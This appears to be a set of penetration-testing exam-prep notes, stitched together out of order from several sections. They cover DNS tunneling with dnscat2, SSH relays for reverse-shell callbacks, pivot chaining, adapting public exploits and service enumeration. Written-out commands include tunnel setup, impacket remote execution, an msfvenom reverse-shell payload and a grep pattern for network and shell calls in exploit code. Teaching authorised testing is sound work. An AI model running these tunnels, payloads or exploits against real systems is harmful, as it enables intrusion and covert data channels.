Discovery action — reference example: Execution context, effects and stopping rule Host/access: A pivot identity/process or reachable SSH service and a drawn source-to-destination path Requires: Controlled/delegated domain or supported direct setup, reachable DNS path, compatible server/client and allowed execution Action class: May start listeners and change routing/forwarding state. Stop/verify: Verify the actual carrier and intended forwarded action; retain delegation and connectivity prerequisites. Failure/next check: No delegation, resolver interference, egress policy or missing runtime can block the route. Keep this a conditional fallback. dig DOMAIN NS Illustrative evidence — synthetic, abbreviated: The excerpt may combine command fields with labelled observations from the preceding investigation; it is not a real-target transcript or a promise of exact tool formatting. Delegated zone: CONTROLLED_DOMAIN Authoritative server: CONTROLLED_NS Resolver path from pivot: not yet verified Recognize this detail: Delegation is an infrastructure prerequisite; an NS record alone does not prove ownership or an operational tunnel. Still missing before method selection: Confirm authorized control, resolver path, compatible client/server/runtime and supported intended operation. Outcome after checking Example and next decision Enabled after validation The controlled carrier and required application operation work: use this constrained fallback. title: 6.1.3.17.4 Discover and verify prerequisites
text: id="4-discover-and-verify-prerequisites-12">6.1.3.17.4 Discover and verify prerequisites dig DOMAIN NS <h3

title: 6.1.3.17.5 Why it works
text: id="5-why-it-works-12">6.1.3.17.5 Why it works DNS tunneling carries data through query/response infrastructure; resolver behavior, delegation, size and latency matter. A DNS callback does not automatically provide a usable full network route. <h3

title: 6.1.3.17.6 Execute and choose variants
text: id="6-execute-and-choose-variants-12">6.1.3.17.6 Execute and choose variants Use only when ordinary transports are unavailable and DNS is demonstrably permitted. This is a conditional advanced route, but it remains in the current official BOK. Prerequisites: command execution sufficient to run a compatible client; either authoritative control/NS delegation for TUNNEL_DOMAIN or direct UDP/53 reachability to the server; a resolver chain that forwards the chosen domain externally; permission to bind/listen on the required DNS port; tolerance for low throughput and conspicuous DNS patterns. Authoritative-domain mode: dnscat2-server --secret=SHARED_SECRET TUNNEL_DOMAIN Client: ./dnscat --secret=SHARED_SECRET TUNNEL_DOMAIN Direct DNS-server mode shown by the server's own usage output: ./dnscat --dns server=DNS_SERVER,port=53 --secret=SHARED_SECRET Server console: windows window -i SESSION_ID help A DNS query reaching the server proves only the resolver path. Match the pre-shared secret or independently verify the negotiated authentication string. Cache, recursion, EDNS, TCP fallback, DNS security controls and response-size limits can affect the channel. DNS tunneling is not DNS spoofing; spoofing remains prohibited by the current exam guide. <h3

title: 6.1.3.18.6 Execute and choose variants
text: id="6-execute-and-choose-variants-13">6.1.3.18.6 Execute and choose variants Decide whether the application resolves the name locally, ProxyChains intercepts it, the SOCKS exit resolves it, or the pivot's configured resolver handles it. Use numeric addresses for route validation; then restore the confirmed hostname when the application protocol requires it. Kerberos needs an SPN-compatible hostname, realm/KDC route and correct time. A working IP connection does not prove Kerberos naming works. A temporary host mapping is acceptable only for a confirmed in-scope address/name pair and must be recorded. getent hosts INTERNAL_FQDN curl --socks5-hostname 127.0.0.1:1080 http://INTERNAL_FQDN:PORT/ klist KRB5_TRACE=/dev/stderr kvno cifs/TARGET_HOST The first command checks Kali's normal resolver. The curl form deliberately delegates the destination hostname through SOCKS. Do not assume a generic resolver utility will be intercepted by ProxyChains: NSS implementation and process behavior vary. For Impacket, preserve the target hostname while routing to an IP when the tool supports it: impacket-wmiexec -k -no-pass -dc-ip DC_IP -target-ip TARGET_IP \ 'DOMAIN/USER@TARGET_HOST' <h3

Interpretation: correct name resolution while preserving the service identity. <h3

Discovery action — reference example: Execution context, effects and stopping rule Host/access: A pivot identity/process or reachable SSH service and a drawn source-to-destination path Requires: Target-to-listener/download-server path, correct advertised address and compatible reverse listener/forward Action class: May start listeners and change routing/forwarding state. Stop/verify: Verify the target-initiated connection from its source context and the final session or downloaded bytes. Failure/next check: Wrong advertised interface, loopback bind or missing reverse forward breaks the return leg while leaving the initial attack functional. ss -lnt ip route get TARGET Illustrative evidence — synthetic, abbreviated: The excerpt may combine command fields with labelled observations from the preceding investigation; it is not a real-target transcript or a promise of exact tool formatting. Tool -> proxy -> target: works Advertised LHOST: assessment-only interface Target -> advertised LHOST: no established route Recognize this detail: A working initiating proxy path does not route a target's new connection back to that private interface. Still missing before method selection: Check the target's route, listener bind, chosen reverse forward/agent listener and final handler. Outcome after checking Example and next decision Enabled after validation The target-initiated leg reaches the intended receiver and effect is verified: use the return route. Ruled out in this context The target cannot reach the advertised address and no selected forward provides it: reject that callback address/design. Inconclusive No packets without execution proof leaves trigger and route separately unresolved. title: 6.1.3.19.5 Why it works
text: id="5-why-it-works-14">6.1.3.19.5 Why it works Tool-to-target traffic and target-initiated callbacks can require opposite forwards. A working SOCKS request does not automatically route a target's reverse shell to Kali. <h3

title: 6.1.3.19.6 Execute and choose variants
text: id="6-execute-and-choose-variants-14">6.1.3.19.6 Execute and choose variants A forward path and callback path are different graphs: Kali -> tunnel -> internal service # access path internal target -> pivot -> Kali listener # callback path Options: make the callback directly to an address the internal host already reaches; expose a listener on the pivot and relay it to Kali; use a Ligolo agent listener or SSH/Chisel remote forward; choose a non-callback technique such as authenticated remote execution. Fixed SSH callback relay, run from the pivot: ssh -N -g -L 0.0.0.0:PIVOT_PORT:127.0.0.1:KALI_PORT \ KALI_USER@LHOST -o ExitOnForwardFailure=yes This creates the listener on the SSH client/pivot and makes the destination connection from Kali's SSH server to Kali loopback. -g permits other hosts to use the pivot-side local forward. Verify the actual bind with ss ; do not infer it from command syntax. Also route payload delivery separately. An internal host may reach the pivot but not Kali's HTTP server; relay the delivery service or serve from the pivot when justified. <h3

title: 6.1.3.20.2.1 Find the clue from your starting access
text: id="find-the-clue-from-your-starting-access-15">6.1.3.20.2.1 Find the clue from your starting access Where to investigate: Start from the last verified first-hop state, inspect the next foothold's routes and assign each new listener/carrier a source and destination. Discovery action — reference example: Execution context, effects and stopping rule Host/access: A pivot identity/process or reachable SSH service and a drawn source-to-destination path Requires: A working first route, explicit second carrier/listener directions and correct per-hop DNS/return paths Action class: May start listeners and change routing/forwarding state. Stop/verify: Validate each hop with an application-aware test before chaining the final client. Failure/next check: Avoid rebuilding every tunnel after one failure. Isolate the first broken leg and preserve working state. hostname ip route ss -lnt Illustrative evidence — synthetic, abbreviated: The excerpt may combine command fields with labelled observations from the preceding investigation; it is not a real-target transcript or a promise of exact tool formatting. Hop 1 service test: works Hop 2 carrier: connected Final application: times out Recognize this detail: The break lies beyond a known working leg; a connected second carrier is not a complete final route. Still missing before method selection: Test each listener-to-destination leg, names and return traffic independently from the correct source. Outcome after checking Example and next decision Enabled after validation Every required application leg is verified: use the composed route. Ruled out in this context One required hop cannot reach the destination under the selected topology: reject that composition. Inconclusive A final timeout without per-leg tests cannot identify which hop failed. If you do not yet have this clue: start with Discover pivot interfaces, routes and internal service context . <h3

text: id="5-why-it-works-15">6.1.3.20.5 Why it works Each additional hop introduces another initiator/listener/destination path. A connected second agent does not prove that the final application or callback crosses every leg. <h3

title: 6.1.3.20.6 Execute and choose variants
text: id="6-execute-and-choose-variants-15">6.1.3.20.6 Execute and choose variants For every additional hop, write another complete segment: Kali -> tunnel A -> PIVOT_A -> tunnel B -> PIVOT_B -> INTERNAL_HOST:PORT Rules: validate one hop before adding the next; avoid overlapping local/VPN/internal routes; use unique listener and SOCKS ports; record which session owns each route; ensure the deeper agent/client can reach the upstream listener; re-evaluate DNS and callback direction at every hop; prefer a routed method for several deep services instead of stacking many opaque wrappers. An upstream tunnel failure invalidates every deeper observation. Do not troubleshoot target credentials until the complete path is restored. <h3

title: 4.1 Select and adapt public exploits
text: id="select-and-adapt-public-exploits">4.1 Select and adapt public exploits Strategy map | Master Notes | Operational index | Cheatsheets Match the exploit's assumptions before editing it. Separate dependency, transaction, payload, connection and result failures; make the smallest evidence-backed change. Speedrun blocks: 6; relevant 14. Documented methods: 4. Examples are hypothetical study material. Apply commands only to an assigned scope during the later practice phase. A method is enabled by its prerequisites; its presence here does not establish a vulnerability or practical mastery. <h2

title: 4.1.1 First pass: tools and findings
text: id="first-pass-tools-and-findings">4.1.1 First pass: tools and findings Use the branch matching the current host, identity and observed result. Tool output supplies leads; the linked procedure verifies and uses the exact condition. <h3

title: 4.1.1.1 Find a PoC for the confirmed component
text: id="find-a-poc-for-the-confirmed-component">4.1.1.1 Find a PoC for the confirmed component SearchSploit/advisory results are candidates. Read the feature, build, authentication and configuration requirements. searchsploit --cve CVE searchsploit -t "PRODUCT VERSION" searchsploit PRODUCT VERSION --exclude="/dos/" If The vulnerable feature and required access match: Read the PoC code and recreate its runtime before execution. → Audit a PoC and reproduce its interpreter/dependency environment . Otherwise: Only the banner/version matches: return to component enumeration. → Identify applications and validate selected NSE checks . <h3

title: 4.1.1.2 Inspect interpreter, dependencies and request assumptions
text: id="inspect-interpreter-dependencies-and-request-assumptions">4.1.1.2 Inspect interpreter, dependencies and request assumptions Do not debug blindly by changing payloads; separate a local runtime failure from a target-side rejection. file exploit.py python3 --version python3 -m venv .venv . .venv/bin/activate If Native source/build mismatch: Match process architecture and ABI before compiling. → Compile and minimally adapt an existing native or memory-corruption PoC . If Login, CSRF, path or schema differs: Reconstruct the real protected request. → Repair a web PoC using the real HTTP transaction . Otherwise: The program runs but no effect is verified: return to the advisory's exact conditions. → Match a public exploit to the actual component and configuration . <h2

title: 4.1.2 Discovery workflow
text: id="discovery-workflow">4.1.2 Discovery workflow Start with product/build/configuration evidence; a matching exploit or vulnerable version is not assumed. Follow these observations into a method; the detailed recognition routes below show synthetic output and the checks still needed. Compare advisory and PoC prerequisites with the actual component and enabled features: Match a public exploit to the actual component and configuration . Review code and establish its interpreter/dependencies before interpreting failures: Audit a PoC and reproduce its interpreter/dependency environment . Inspect process architecture and runtime before native compilation/adaptation: Compile and minimally adapt an existing native or memory-corruption PoC . Reconstruct the real request when a web PoC's login, path or parser assumptions differ: Repair a web PoC using the real HTTP transaction . Decision rule: an observed clue opens a candidate. Choose it only after the missing conditions are verified; a failed check rules out that context, while unavailable evidence stays inconclusive . <h2

title: 4.1.3 Method families
text: id="method-families">4.1.3 Method families Selection and local runtime: Match a public exploit to the actual component and configuration , Audit a PoC and reproduce its interpreter/dependency environment . Native and web adaptation: Compile and minimally adapt an existing native or memory-corruption PoC , Repair a web PoC using the real HTTP transaction . <h2

title: 4.1.4 Choose a method
text: id="choose-a-method">4.1.4 Choose a method Method Recognition clue Required access Enabling conditions Resulting capability Match a public exploit to the actual component and configuration A product/version clue, advisory or component-specific public PoC An identified component/build and a candidate exploit with reviewable source Exact vulnerable build/configuration, required access and endpoint behavior; reviewable source and a verifiable expected effect A justified exploit candidate or a documented prerequisite mismatch Audit a PoC and reproduce its interpreter/dependency environment A plausible exploit fails before reaching the target or has unreviewed side effects An identified component/build and a candidate exploit with reviewable source Reviewed source, understood network/file actions, correct interpreter and compatible isolated dependencies A controlled, reproducible tool environment and an understood PoC Compile and minimally adapt an existing native or memory-corruption PoC An existing C/C++ or platform-specific PoC matches the candidate An identified component/build and a candidate exploit with reviewable source Correct compiler/target architecture, runtime dependencies, documented payload constraints and validated exploit-specific constants A compatible reviewed exploit artifact with evidence-backed parameter changes Repair a web PoC using the real HTTP transaction An exploit sends requests but authentication, routing or parsing differs from the target An identified component/build and a candidate exploit with reviewable source A valid baseline transaction with correct host, base path, session/CSRF state and request encoding A PoC that reproduces the relevant application request and a separately verified effect <h2

Discovery action — reference example: Execution context, effects and stopping rule Host/access: An identified component/build and a candidate exploit with reviewable source Requires: Exact vulnerable build/configuration, required access and endpoint behavior; reviewable source and a verifiable expected effect Action class: Inspection/adaptation followed by active exploitation only when its prerequisites are met. Stop/verify: Write the evidence for every prerequisite and the minimal effect that would validate the hypothesis. Failure/next check: A scanner's CVE label or a copied walkthrough command is insufficient. Resolve the build/feature gap before running the PoC. searchsploit PRODUCT VERSION searchsploit -x EXPLOIT_ID Illustrative evidence — synthetic, abbreviated: The excerpt may combine command fields with labelled observations from the preceding investigation; it is not a real-target transcript or a promise of exact tool formatting. Candidate requires: FEATURE enabled, authenticated ROLE, affected BUILD Observed deployment: FEATURE state not yet known Recognize this detail: The exact feature/role/build conditions identify what must be checked; a product-name hit does not establish applicability. Still missing before method selection: Resolve every required condition and define the smallest observable proof of the expected effect. Outcome after checking Example and next decision Enabled after validation Build, feature and access conditions match: review and test the candidate's bounded effect. Ruled out in this context The required feature is disabled or the build is patched: reject that candidate. title: 4.1.5.4 Discover and verify prerequisites
text: id="4-discover-and-verify-prerequisites">4.1.5.4 Discover and verify prerequisites searchsploit PRODUCT VERSION searchsploit -x EXPLOIT_ID <h3

title: 4.1.5.5 Why it works
text: id="5-why-it-works">4.1.5.5 Why it works Version resemblance is weaker than exact applicability. Authentication, feature state, architecture and patch backports can invalidate a published exploit even when the banner looks right. <h3

title: 4.1.5.6 Execute and choose variants
text: id="6-execute-and-choose-variants">4.1.5.6 Execute and choose variants source URL/EDB-ID/CVE/commit: product + component + edition/build: target OS/architecture/runtime: remote or local; pre-auth or authenticated: required configuration/feature/path/credential/privilege: expected effect: exploit runtime and dependencies: hard-coded target/callback/payload assumptions: destructive or stability risk: evidence each prerequisite exists: Do not substitute a scanner label for component evidence. Check vendor/version output, application behavior, files/configuration and the exploit's own affected-version notes. Distribution backports, disabled features, authentication and mitigations can invalidate a simple version match. searchsploit --cve CVE searchsploit -t "PRODUCT VERSION" searchsploit PRODUCT VERSION --exclude="/dos/" Inspect before copying: searchsploit -p EDB_ID searchsploit -x EDB_ID searchsploit -w "PRODUCT VERSION" Copy a working copy, never edit the archive in place: mkdir -p exploit-work cd exploit-work searchsploit -m EDB_ID sha256sum EXPLOIT_FILE file EXPLOIT_FILE Selection cue: prefer a readable, reputable or verified exploit whose prerequisites and outcome match the observed component. Exclude denial-of-service entries when the objective is access. A named Nmap NSE script can validate or exercise a specific known condition, but inspect it and its arguments first: nmap --script-help SCRIPT_NAME sed -n '1,240p' /usr/share/nmap/scripts/SCRIPT_NAME.nse nmap -Pn -p PORT --script SCRIPT_NAME --script-args 'ARG=VALUE' TARGET Script categories such as intrusive , exploit , brute or dos change risk and authorization requirements. A script-reported vulnerable result remains a candidate until its underlying evidence or controlled effect is validated. <summary

title: 4.1.5.6.1 Variant — source repository rather than Exploit-DB
text: id="variant-4-1-5-6-1">4.1.5.6.1 Variant — source repository rather than Exploit-DB Record and pin the exact source state: git clone REPOSITORY_URL exploit-source cd exploit-source git log -1 --format='%H %ad %s' --date=iso-strict git status --short Read the README, license, dependency files, open issues relevant to the target version and the actual execution path. title: 4.1.6.6 Execute and choose variants
text: id="6-execute-and-choose-variants-1">4.1.6.6 Execute and choose variants Start with metadata and readable text: file EXPLOIT_FILE sha256sum EXPLOIT_FILE sed -n '1,240p' EXPLOIT_FILE grep -nEi 'sudo|setuid|chmod|chown|rm |unlink|remove|subprocess|system\(|popen|exec\(|socket|connect|requests|curl|wget|powershell|cmd\.exe|/bin/(ba)?sh|http://|https://' EXPLOIT_FILE For binaries, prefer obtaining inspectable source. If only a binary exists, treat it as a substantially higher-risk choice: file EXPLOIT_BINARY sha256sum EXPLOIT_BINARY strings -a EXPLOIT_BINARY | less objdump -f EXPLOIT_BINARY Audit for: unexpected privilege requirements on the attacking host; destructive file/process/service operations or denial of service; downloads, callbacks or telemetry to third parties; embedded credentials, tokens, commands or payloads; files written or overwritten and their cleanup behavior; hard-coded target addresses, ports, paths, virtual hosts and callback values; authentication, cookie, CSRF, redirect, TLS and proxy assumptions; target OS, architecture, runtime, library and payload assumptions; success messages that are printed without verifying the claimed effect. Safety cue: use source, a disposable environment and a clean snapshot when uncertainty remains. Do not grant sudo merely because an unknown PoC requests it. head -n 1 EXPLOIT_FILE python3 --version gcc --version file EXPLOIT_FILE Separate three architectures: where the exploit program itself runs; the vulnerable target process; the payload that will execute inside or on the target. A remote Python exploit may run on Kali while delivering a Windows x64 payload. A local Linux exploit normally must run on the target-compatible architecture. Compiler choice follows the produced program; payload choice follows the target execution context. After source review: python3 -m py_compile exploit.py python3 exploit.py --help Isolate explicit dependencies: python3 -m venv .venv source .venv/bin/activate python -m pip install --upgrade pip python -m pip install -r requirements.txt python -m pip freeze > requirements-resolved.txt Run --help only after confirming that module import and argument handling do not trigger the exploit. Old Python 2 syntax, str / bytes mistakes, renamed modules and obsolete TLS dependencies are runtime problems, not target evidence. Useful diagnostics: python3 -X dev exploit.py ARGUMENTS python3 -m trace --trace exploit.py ARGUMENTS Use tracing only when its output is bounded and does not expose credentials. Prefer adding a few prints around the failing request/parser over changing many lines at once. Use when: a source-based Python assessment tool has dependencies that should not modify Kali's system Python. This is setup/reference material, not authorization to install a tool. <h5

text: id="linuxkali-virtual-environment">4.1.6.6.1.1 Linux/Kali virtual environment python3 -m venv .venv source .venv/bin/activate python -m pip install --upgrade pip python -m pip install -r requirements.txt Install one explicitly selected package only when needed: python -m pip install PACKAGE python -m pip show PACKAGE python -m pip freeze deactivate PEP 668 intentionally protects externally managed system environments. Do not bypass it with --break-system-packages ; use a venv or the distribution package when appropriate. <h5

title: 4.1.7.5 Why it works
text: id="5-why-it-works-2">4.1.7.5 Why it works Compilation architecture and target process architecture must match the PoC's assumptions. Existing offsets, bad-character constraints or payload space are exploit-specific; dedicated exploit development is outside this preparation route. <h3

title: 4.1.7.6 Execute and choose variants
text: id="6-execute-and-choose-variants-2">4.1.7.6 Execute and choose variants Linux/ELF program: gcc -Wall -Wextra exploit.c -o exploit file exploit ldd exploit sha256sum exploit 32-bit output requires matching headers/libraries: gcc -m32 -Wall -Wextra exploit.c -o exploit32 file exploit32 Windows PE from Kali: i686-w64-mingw32-gcc exploit.c -o exploit-x86.exe x86_64-w64-mingw32-gcc exploit.c -o exploit-x64.exe file exploit-x86.exe exploit-x64.exe Windows socket code commonly needs the Winsock import library: i686-w64-mingw32-gcc exploit.c -o exploit-x86.exe -lws2_32 x86_64-w64-mingw32-gcc exploit.c -o exploit-x64.exe -lws2_32 Failure cue: undefined references are linker evidence. Identify the missing symbol and documented library; do not delete calls until the binary compiles. Exec format error means the produced format/architecture cannot run in the current environment. Change one assumption at a time and retain a diff: cp EXPLOIT_FILE EXPLOIT_FILE.orig git diff --no-index -- EXPLOIT_FILE.orig EXPLOIT_FILE Typical adaptations are: Assumption Evidence-backed edit Target address/port Observed reachable endpoint HTTP/HTTPS and base path Reproduced application request Virtual host or Host header Resolved application identity Username/password/cookie Valid Block 5 authentication context CSRF/session parsing Actual request/response sequence LHOST/LPORT Address and listener reachable from the target context Command or payload Target OS, interpreter, architecture, size and bad-character constraints File path/name Writable/executable target path and application behavior Timeout/retry Measured service behavior, not blind delay inflation Do not combine prerequisite repair, payload replacement and parser rewrites in one unreviewable change. Dedicated overflow development, offset drills and shellcode development are excluded from this speedrun. Use this section only to understand and adapt an existing PoC whose vulnerable build and assumptions are supported by evidence. Review the PoC comments and code for: exact vulnerable build and target architecture; hard-coded target/callback address and port; return address/module assumptions and target profiles; recorded offset, available payload space and bad characters; payload architecture, type and exit behavior; crash/restart and reliability expectations. Replace an embedded payload only when the PoC documents its constraints: msfvenom -p windows/shell_reverse_tcp \ LHOST=LHOST LPORT=LPORT \ -f c -v payload \ -b '\x00\x0a\x0d' Use the PoC's actual bad-character and space requirements; the example list is not universal. A changed build, missing module, mitigation or misaligned offset invalidates the PoC and should not trigger a fresh exploit-development detour in this route. <h3

text: id="find-the-clue-from-your-starting-access-3">4.1.8.2.1 Find the clue from your starting access Where to investigate: Capture the application's real valid transaction and compare it with the PoC's request path, login/session sequence and response parser. Discovery action — reference example: Execution context, effects and stopping rule Host/access: An identified component/build and a candidate exploit with reviewable source Requires: A valid baseline transaction with correct host, base path, session/CSRF state and request encoding Action class: Inspection/adaptation followed by active exploitation only when its prerequisites are met. Stop/verify: Check the target action/output rather than trusting the PoC's success string. Failure/next check: A normal HTTP response can be an authentication or parsing failure. Separate application request repair from payload/callback diagnosis. curl -sk -i -b cookies.txt http://TARGET:PORT/PATH Illustrative evidence — synthetic, abbreviated: The excerpt may combine command fields with labelled observations from the preceding investigation; it is not a real-target transcript or a promise of exact tool formatting. PoC response: HTTP/1.1 302 Found Location: /login Actual browser request includes a fresh CSRF token Recognize this detail: The request never reached the protected operation; the success parser may be reading a login response. Still missing before method selection: Restore valid host/path/session/CSRF state, then independently verify the exploit effect. Outcome after checking Example and next decision Enabled after validation The reconstructed request reaches the intended operation and the effect is observed: continue that candidate. title: 4.1.8.5 Why it works
text: id="5-why-it-works-3">4.1.8.5 Why it works Web exploit assumptions often fail at login, cookie handling, URL construction or response parsing before the vulnerable behavior is reached. Reconstruct the request before editing payload logic. <h3

title: 4.1.8.6 Execute and choose variants
text: id="6-execute-and-choose-variants-3">4.1.8.6 Execute and choose variants Before changing the script, reproduce the relevant request with Burp or curl and compare: curl -i -X METHOD 'SCHEME://HOSTNAME:PORT/PATH' \ -H 'Host: HOSTNAME' \ -H 'Cookie: COOKIE' \ --data 'PARAM=VALUE' For a scoped lab with a known self-signed certificate: curl -k -i 'https://HOSTNAME:PORT/PATH' In Python Requests, use a session when cookies or defaults must persist: with requests.Session() as session: response = session.get(url, timeout=10) print(response.status_code, response.url) print(response.headers) print(response.text[:500]) Set verify=False only for a scoped test after confirming the certificate problem; it disables certificate and hostname validation. Prefer a supplied CA bundle when possible. Parser cue: IndexError , missing-key and regular-expression failures mean the received response did not have the assumed shape. Print status, final URL, headers and a bounded body fragment before rewriting the parser. Common causes are a changed path, redirect, failed login, CSRF change, error page, proxy/WAF response or certificate handling. <h3

Dedicated exploit development is excluded; existing PoC adaptation remains included. Commands and their adjacent variant conditions are synchronized extracts of the linked operational procedures. Those procedures own complete execution details; this guide owns method selection, explanations and worked reasoning. Tool availability on the learner's Kali or a target must be checked in that environment.

title: 1.2 Extract opportunities from services
text: id="extract-opportunities-from-services">1.2 Extract opportunities from services Strategy map | Master Notes | Operational index | Cheatsheets A service can disclose names, files, rights or execution. Test authentication , read, write and execution separately. A write becomes an execution path only when a useful consumer and trigger exist. Speedrun blocks: 2; authenticated re-enumeration throughout. Documented methods: 15. Examples are hypothetical study material. Apply commands only to an assigned scope during the later practice phase. A method is enabled by its prerequisites; its presence here does not establish a vulnerability or practical mastery. <h2

title: 1.2.1 First pass: tools and findings
text: id="first-pass-tools-and-findings">1.2.1 First pass: tools and findings Use the branch matching the current host, identity and observed result. Tool output supplies leads; the linked procedure verifies and uses the exact condition. <h3

title: 1.2.1.1 Try SMB with the actual access context
text: id="try-smb-with-the-actual-access-context">1.2.1.1 Try SMB with the actual access context Use the anonymous form first when no credentials exist; use the authenticated variant when an identity is available. smbclient -N -L //TARGET If A readable share contains config, backups or keys: Read the exact file and record its source before testing any recovered value. → Classify the artifact and its identity context . If A working domain identity: Enumerate domain shares with that identity; share listing alone is not file access. → Read domain shares, SYSVOL and NETLOGON for useful artifacts . Otherwise: SMB is denied: inspect another discovered protocol, not repeated guesses against the same identity. → Identify applications and validate selected NSE checks . <h3

title: 1.2.1.2 Query exposed names and configuration
text: id="query-exposed-names-and-configuration">1.2.1.2 Query exposed names and configuration Use only an observed/assigned community and the correct SNMP version; preserve the returned OIDs. snmpwalk -v2c -c COMMUNITY TARGET 1.3.6.1.2.1.1 If Process arguments or configuration contain an account value: Classify its account scope and format. → Classify the artifact and its identity context . If A hostname or directory-service clue: Resolve it through the relevant name service. → Expand names through DNS records and zone transfers . Otherwise: No useful SNMP response: return to the confirmed service list and choose its native client. → Identify applications and validate selected NSE checks . <h3

title: 1.2.1.3 Inspect database identity and grants
text: id="inspect-database-identity-and-grants">1.2.1.3 Inspect database identity and grants Use this branch only for confirmed SQL Server with an accepted login. Other database clients are separate procedures. SELECT SYSTEM_USER, ORIGINAL_LOGIN(), @@VERSION; SELECT IS_SRVROLEMEMBER('sysadmin'); If A permitted impersonation or command facility: Check the effective login and the exact enabled operation before attempting an OS effect. → Use SQL Server rights, impersonation and command facilities . If MySQL/MariaDB identified instead of SQL Server: Use the MySQL/MariaDB grants and file rules rather than SQL Server syntax. → Use MySQL/MariaDB data and file primitives . Otherwise: Login succeeds but the action is denied: inspect grants under the same identity. → Use SQL Server rights, impersonation and command facilities . <h2

title: 1.2.2 Discovery workflow
text: id="discovery-workflow">1.2.2 Discovery workflow Start with application evidence from discovery; anonymous access, valid credentials and useful rights are separate questions. Follow these observations into a method; the detailed recognition routes below show synthetic output and the checks still needed. Use the matching protocol client and establish which identity the service accepts: Use anonymous or authenticated FTP file access ; Enumerate SMB/RPC shares, files and identities ; Use SSH passwords, keys and forwarding-capable access . Investigate names, account clues and configuration with the available service context: Expand names through DNS records and zone transfers ; Extract configuration and process information through SNMP ; Enumerate SMTP identities and accessible mailbox protocols ; Discover LDAP naming contexts and authenticated search . For databases inspect the current identity and grants before file or execution hypotheses: Use MySQL/MariaDB data and file primitives ; Use SQL Server rights, impersonation and command facilities ; Use PostgreSQL data and privileged program execution . Retrieve relevant artifacts, classify credentials, and re-enumerate with any new accepted identity: Classify the artifact and its identity context ; Validate known passwords and context-specific reuse . Decision rule: an observed clue opens a candidate. Choose it only after the missing conditions are verified; a failed check rules out that context, while unavailable evidence stays inconclusive . <h2

title: 1.2.3 Method families
text: id="method-families">1.2.3 Method families File and shell access: Use anonymous or authenticated FTP file access , Enumerate SMB/RPC shares, files and identities , Inspect RPC/NFS exports and effective file identity , Use SSH passwords, keys and forwarding-capable access . Identity and configuration disclosure: Expand names through DNS records and zone transfers , Extract configuration and process information through SNMP , Enumerate SMTP identities and accessible mailbox protocols , Discover LDAP naming contexts and authenticated search . Database privileges and primitives: Use MySQL/MariaDB data and file primitives , Use SQL Server rights, impersonation and command facilities , Use PostgreSQL data and privileged program execution , Inspect Redis access and persistence boundaries , Triage Oracle listener and database identity . Remote access and uncommon applications: Validate RDP, WinRM, VNC and Telnet access contexts , Investigate SIP/IRC identity and configuration clues . <h2

title: 1.2.4 Choose a method
text: id="choose-a-method">1.2.4 Choose a method Method Recognition clue Required access Enabling conditions Resulting capability Use anonymous or authenticated FTP file access An FTP banner or accessible listing A confirmed reachable application; anonymous context or one identified credential Anonymous login allowed or a valid FTP identity; data-channel connectivity and object-specific read/write rights Retrieved files, configuration or a verified writable location Enumerate SMB/RPC shares, files and identities SMB/RPC endpoints, domain clues or new credentials A confirmed reachable application; anonymous context or one identified credential Reachable SMB/RPC; anonymous, guest, local or domain context must be explicit; share and filesystem ACLs both matter Domain/user clues, readable files or object-specific writable access Inspect RPC/NFS exports and effective file identity RPC/NFS listeners or export information A confirmed reachable application; anonymous context or one identified credential Reachable RPC/NFS transports, permitted client address and an export whose UID/GID mapping grants relevant access Readable files or a controlled write with established identity semantics Use SSH passwords, keys and forwarding-capable access An SSH service and a known password, private key or agent context A confirmed reachable application; anonymous context or one identified credential Compatible authentication method, correct user, accepted key policy and the requested shell/subsystem permission An authenticated shell, subsystem or forwarding capability with verified identity Expand names through DNS records and zone transfers A DNS server, domain name or host aliases A confirmed reachable application; anonymous context or one identified credential Reachable DNS transport and relevant authoritative zone; AXFR requires an allowed TCP zone transfer Hostnames, address relationships and possibly a zone inventory Extract configuration and process information through SNMP UDP/161 evidence or an exposed management plane A confirmed reachable application; anonymous context or one identified credential An accepted read community or SNMPv3 identity/security level; transport and view permissions Host, interface, software or process/configuration clues from permitted OID branches Enumerate SMTP identities and accessible mailbox protocols SMTP capabilities or mail-related account clues A confirmed reachable application; anonymous context or one identified credential Reachable SMTP/POP3/IMAP service; enumeration or mailbox access must be enabled for the selected context Validated mail capabilities, possible usernames or authenticated mailbox artifacts Discover LDAP naming contexts and authenticated search LDAP/Kerberos listeners or a probable AD domain A confirmed reachable application; anonymous context or one identified credential Reachable directory; anonymous query permission or valid bind identity; required signing/TLS and naming context A directory base DN and permitted account/group/computer attributes Use MySQL/MariaDB data and file primitives A MySQL-compatible service and valid application/database credentials A confirmed reachable application; anonymous context or one identified credential Database authentication and exact schema/file privileges; secure_file_priv and server filesystem identity constrain file actions Useful data or a permission-backed server-side file operation Use SQL Server rights, impersonation and command facilities SQL Server credentials or a Windows identity accepted by the database A confirmed reachable application; anonymous context or one identified credential Correct SQL versus Windows authentication; database role and configuration must permit the requested operation Database data, a more useful SQL security context or verified server command execution Use PostgreSQL data and privileged program execution PostgreSQL access or an application connection string A confirmed reachable application; anonymous context or one identified credential Accepted connection/database role; COPY PROGRAM needs the corresponding server privilege and an executable OS context Database information or a verified privilege-backed OS effect Inspect Redis access and persistence boundaries A Redis listener or application cache credentials A confirmed reachable application; anonymous context or one identified credential Reachability and accepted authentication/ACL commands; persistence writes need CONFIG rights, destination permissions and a consumer Useful accessible keys or a precisely bounded persistence/file-write candidate Triage Oracle listener and database identity An Oracle TNS listener or connection descriptor A confirmed reachable application; anonymous context or one identified credential Correct service/ SID , reachable database transport and valid database credentials for authenticated work A confirmed listener/service context and permission-scoped database access Validate RDP, WinRM, VNC and Telnet access contexts An exposed remote-access application and compatible known credentials A confirmed reachable application; anonymous context or one identified credential Enabled destination service, matching authentication and protocol-specific logon/session rights A verified remote session or a precise authentication/ authorization failure Investigate SIP/IRC identity and configuration clues A confirmed SIP or IRC application A confirmed reachable application;
